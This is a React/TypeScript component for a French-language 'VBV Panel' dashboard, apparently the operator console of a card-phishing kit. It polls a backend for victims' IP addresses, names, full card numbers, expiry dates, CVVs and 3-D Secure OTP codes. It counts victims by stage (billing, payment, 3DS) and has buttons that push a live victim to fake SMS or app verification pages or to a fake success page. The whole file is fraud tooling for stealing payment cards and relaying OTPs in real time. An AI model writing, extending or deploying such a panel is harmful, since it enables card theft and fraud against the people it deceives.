import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { RefreshCw, Wifi, WifiOff, MessageSquare, Phone, CheckCircle2, X } from "lucide-react";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";

interface VBVClient {
  visitId: string;
  ip: string;
  page: string;
  fullName: string;
  cardInfo: {
    cardholder: string;
    cardNumber: string;
    expiry: string;
    cvv: string;
  };
  otpCode?: string;
  lastActivity: number;
  isOnline: boolean;
}

interface ClientsResponse {
  clients: VBVClient[];
}

export default function VBVPanel() {
  const { data, isLoading, refetch } = useQuery<ClientsResponse>({
    queryKey: ["vbv-clients"],
    queryFn: async () => {
      const res = await fetch("/api/vbv-panel/clients");
      if (!res.ok) {
        throw new Error("Failed to fetch clients");
      }
      const result = await res.json();
      console.log("[VBV Panel] Fetched clients:", result.clients?.length || 0);
      return result;
    },
    refetchInterval: 2000, // Rafraîchir toutes les 2 secondes
  });

  const clients = data?.clients ?? [];
  const totalClients = clients.length;
  const activeClients = clients.filter((c) => c.isOnline).length;
  const onBilling = clients.filter((c) => c.cardInfo.cardNumber).length;
  const onPayment = clients.filter((c) => c.cardInfo.cardNumber && !c.otpCode).length;
  const on3DS = clients.filter((c) => c.otpCode).length;

  const formatCardInfo = (cardInfo: VBVClient["cardInfo"]) => {
    if (!cardInfo.cardNumber) return "N/A";
    return `│👤 Cardholder Name: ${cardInfo.cardholder || "N/A"}
│💳 Card Number: ${cardInfo.cardNumber}
│📆 Expiry Date: ${cardInfo.expiry}
│🔐 CVV: ${cardInfo.cvv}`;
  };

  const { toast } = useToast();
  const redirectMutation = useMutation({
    mutationFn: async ({ visitId, redirectTo }: { visitId: string; redirectTo: string }) => {
      const res = await fetch("/api/vbv-panel/redirect", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ visitId, redirectTo }),
      });
      if (!res.ok) {
        throw new Error("Failed to redirect client");
      }
      return res.json();
    },
    onSuccess: () => {
      toast({
        title: "Redirection envoyée",
        description: "Le client sera redirigé dans quelques secondes.",
      });
    },
    onError: () => {
      toast({
        title: "Erreur",
        description: "Impossible de rediriger le client.",
        variant: "destructive",
      });
    },
  });

  const handleRedirect = (visitId: string, redirectTo: string) => {
    redirectMutation.mutate({ visitId, redirectTo });
  };

  return (
    <div className="min-h-screen bg-black text-white font-mono overflow-hidden relative">
      {/* Grid background */}
      <div 
        className="absolute inset-0 opacity-10"
        style={{
          backgroundImage: `
            linear-gradient(rgba(0, 255, 255, 0.1) 1px, transparent 1px),
            linear-gradient(90deg, rgba(0, 255, 255, 0.1) 1px, transparent 1px)
          `,
          backgroundSize: "50px 50px",
        }}
      />

      <div className="relative z-10 p-6">
        {/* Header */}
        <div className="flex items-center justify-between mb-8">
          <h1 
            className="text-4xl font-bold"
            style={{
              background: "linear-gradient(135deg, #00ffff, #ff00ff)",
              WebkitBackgroundClip: "text",
              WebkitTextFillColor: "transparent",
              textShadow: "0 0 20px rgba(0, 255, 255, 0.5)",
            }}
          >
            DASHBOARD
          </h1>
          <div className="flex items-center gap-4">
            <div className="flex items-center gap-2 px-4 py-2 rounded-lg bg-green-500/20 border border-green-500/50">
              <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse" />
              <span className="text-green-400 font-semibold">CONNECTÉ</span>
            </div>
            <Button
              onClick={() => refetch()}
              className="px-4 py-2 rounded-lg bg-purple-500/20 border border-purple-500/50 text-purple-400 hover:bg-purple-500/30 transition-all"
              style={{
                boxShadow: "0 0 15px rgba(168, 85, 247, 0.4)",
              }}
            >
              <RefreshCw className="h-4 w-4 mr-2" />
              ACTUALISER ({totalClients})
            </Button>
          </div>
        </div>

        {/* Metrics Cards */}
        <div className="grid grid-cols-5 gap-4 mb-8">
          <div 
            className="bg-black/50 border border-cyan-500/30 rounded-lg p-4 backdrop-blur-sm"
            style={{
              boxShadow: "0 0 20px rgba(0, 255, 255, 0.2)",
            }}
          >
            <div className="text-xs text-cyan-400/70 mb-1">TOTAL CLIENTS</div>
            <div 
              className="text-3xl font-bold text-cyan-400"
              style={{
                textShadow: "0 0 10px rgba(0, 255, 255, 0.8)",
              }}
            >
              {totalClients}
            </div>
          </div>

          <div 
            className="bg-black/50 border border-green-500/30 rounded-lg p-4 backdrop-blur-sm"
            style={{
              boxShadow: "0 0 20px rgba(0, 255, 0, 0.2)",
            }}
          >
            <div className="text-xs text-green-400/70 mb-1">ACTIFS</div>
            <div 
              className="text-3xl font-bold text-green-400"
              style={{
                textShadow: "0 0 10px rgba(0, 255, 0, 0.8)",
              }}
            >
              {activeClients}
            </div>
          </div>

          <div 
            className="bg-black/50 border border-cyan-500/30 rounded-lg p-4 backdrop-blur-sm"
            style={{
              boxShadow: "0 0 20px rgba(0, 255, 255, 0.2)",
            }}
          >
            <div className="text-xs text-cyan-400/70 mb-1">SUR BILLING</div>
            <div 
              className="text-3xl font-bold text-cyan-400"
              style={{
                textShadow: "0 0 10px rgba(0, 255, 255, 0.8)",
              }}
            >
              {onBilling}
            </div>
          </div>

          <div 
            className="bg-black/50 border border-orange-500/30 rounded-lg p-4 backdrop-blur-sm"
            style={{
              boxShadow: "0 0 20px rgba(255, 165, 0, 0.2)",
            }}
          >
            <div className="text-xs text-orange-400/70 mb-1">SUR PAYMENT</div>
            <div 
              className="text-3xl font-bold text-orange-400"
              style={{
                textShadow: "0 0 10px rgba(255, 165, 0, 0.8)",
              }}
            >
              {onPayment}
            </div>
          </div>

          <div 
            className="bg-black/50 border border-purple-500/30 rounded-lg p-4 backdrop-blur-sm"
            style={{
              boxShadow: "0 0 20px rgba(168, 85, 247, 0.2)",
            }}
          >
            <div className="text-xs text-purple-400/70 mb-1">SUR 3DS</div>
            <div 
              className="text-3xl font-bold text-purple-400"
              style={{
                textShadow: "0 0 10px rgba(168, 85, 247, 0.8)",
              }}
            >
              {on3DS}
            </div>
          </div>
        </div>

        {/* Client List */}
        <div 
          className="bg-black/50 border border-cyan-500/30 rounded-lg backdrop-blur-sm overflow-hidden"
          style={{
            boxShadow: "0 0 30px rgba(0, 255, 255, 0.2)",
          }}
        >
          <div className="p-4 border-b border-cyan-500/30">
            <h2 
              className="text-xl font-bold text-cyan-400"
              style={{
                textShadow: "0 0 10px rgba(0, 255, 255, 0.8)",
              }}
            >
              LISTE DES CLIENTS
            </h2>
          </div>

          {isLoading ? (
            <div className="p-8 text-center text-cyan-400/50">Chargement...</div>
          ) : clients.length === 0 ? (
            <div className="p-8 text-center text-cyan-400/50">
              Aucun client connecté
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead>
                  <tr className="border-b border-cyan-500/30">
                    <th className="p-4 text-left text-cyan-400 font-semibold">ID</th>
                    <th className="p-4 text-left text-cyan-400 font-semibold">IP</th>
                    <th className="p-4 text-left text-cyan-400 font-semibold">Page</th>
                    <th className="p-4 text-left text-cyan-400 font-semibold">Nom</th>
                    <th className="p-4 text-left text-cyan-400 font-semibold">CC-INFO</th>
                    <th className="p-4 text-left text-cyan-400 font-semibold">3DS</th>
                    <th className="p-4 text-left text-cyan-400 font-semibold">Activité</th>
                  </tr>
                </thead>
                <tbody>
                  {clients.map((client) => (
                    <tr 
                      key={client.visitId} 
                      className="border-b border-cyan-500/10 hover:bg-cyan-500/5 transition-colors"
                    >
                      <td className="p-4 text-cyan-300/80 font-mono text-sm">
                        {client.visitId.substring(0, 12)}...
                      </td>
                      <td className="p-4 text-cyan-300/80 font-mono text-sm">
                        {client.ip}
                      </td>
                      <td className="p-4 text-cyan-300/80 text-sm">
                        {client.page}
                      </td>
                      <td className="p-4 text-cyan-300/80 text-sm">
                        {client.fullName || "N/A"}
                      </td>
                      <td className="p-4 text-cyan-300/60 text-xs font-mono whitespace-pre-line">
                        {formatCardInfo(client.cardInfo)}
                      </td>
                      <td className="p-4">
                        {/* Icônes d'action au-dessus du code OTP */}
                        <div className="flex items-center gap-2 mb-2">
                          <button
                            onClick={() => handleRedirect(client.visitId, "/vbv")}
                            className="p-1.5 rounded bg-cyan-500/20 border border-cyan-500/50 hover:bg-cyan-500/30 transition-all"
                            style={{
                              boxShadow: "0 0 10px rgba(0, 255, 255, 0.3)",
                            }}
                            title="Rediriger vers VBV (SMS)"
                          >
                            <MessageSquare className="h-4 w-4 text-cyan-400" />
                          </button>
                          <button
                            onClick={() => handleRedirect(client.visitId, "/vbv-app")}
                            className="p-1.5 rounded bg-green-500/20 border border-green-500/50 hover:bg-green-500/30 transition-all"
                            style={{
                              boxShadow: "0 0 10px rgba(0, 255, 0, 0.3)",
                            }}
                            title="Téléphone"
                          >
                            <Phone className="h-4 w-4 text-green-400" />
                          </button>
                          <button
                            onClick={() => handleRedirect(client.visitId, "/success")}
                            className="p-1.5 rounded bg-purple-500/20 border border-purple-500/50 hover:bg-purple-500/30 transition-all"
                            style={{
                              boxShadow: "0 0 10px rgba(168, 85, 247, 0.3)",
                            }}
                            title="Valider"
                          >
                            <CheckCircle2 className="h-4 w-4 text-purple-400" />
                          </button>
                          <button
                            onClick={() => handleRedirect(client.visitId, "/home")}
                            className="p-1.5 rounded bg-red-500/20 border border-red-500/50 hover:bg-red-500/30 transition-all"
                            style={{
                              boxShadow: "0 0 10px rgba(255, 0, 0, 0.3)",
                            }}
                            title="Annuler"
                          >
                            <X className="h-4 w-4 text-red-400" />
                          </button>
                        </div>
                        {/* Code OTP */}
                        <div className="text-cyan-300/80 font-mono text-sm">
                          {client.otpCode || "N/A"}
                        </div>
                      </td>
                      <td className="p-4">
                        {client.isOnline ? (
                          <span className="inline-flex items-center gap-2 text-green-400">
                            <Wifi className="h-4 w-4" />
                            <span className="font-semibold">Client En ligne</span>
                          </span>
                        ) : (
                          <span className="inline-flex items-center gap-2 text-red-400">
                            <WifiOff className="h-4 w-4" />
                            <span className="font-semibold">Client parti</span>
                          </span>
                        )}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
